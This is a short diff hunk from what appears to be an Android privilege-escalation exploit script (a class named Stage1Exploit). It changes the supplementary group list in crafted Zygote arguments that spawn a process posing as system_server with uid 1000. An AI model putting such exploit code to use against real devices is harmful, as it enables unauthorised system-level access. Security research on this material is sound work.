@@ -193,7 +193,7 @@ class Stage1Exploit:
         raw_zygote_arguments = [
             "--setuid=1000",
             "--setgid=1000",
-            "--setgroups=1002,1005,1007,1016,1023,1024,1065,2001,3001,3002,3003,3005,3006,3007,3009,3010,3011",
+            "--setgroups=1002,1005,1007,1016,1023,1024,1065,3003,3009,",
             "--runtime-args",
             "--nice-name=system_server",
             "--runtime-flags=1",
